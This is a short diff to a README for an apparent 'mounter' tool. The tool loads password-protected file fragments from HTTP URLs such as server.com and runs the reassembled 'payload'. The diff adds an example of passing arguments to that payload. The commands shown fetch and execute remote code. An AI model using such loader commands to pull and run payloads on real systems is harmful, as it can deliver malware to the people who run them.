@@ -96,6 +96,11 @@ The mounter can load fragments from HTTP URLs or local filesystem (auto-detected
   --password "your_secret_password" \
   -v
 
+# Passing arguments to the executed payload (use `--` to separate CLI flags)
+./target/release/mounter.exe \
+  -u url1,url2 \
+  -- --payload-flag "value" -v
+
 # Multiple URLs with comma separation
 ./target/release/mounter.exe -u http://server.com/file.part000,http://server.com/file.part001
 
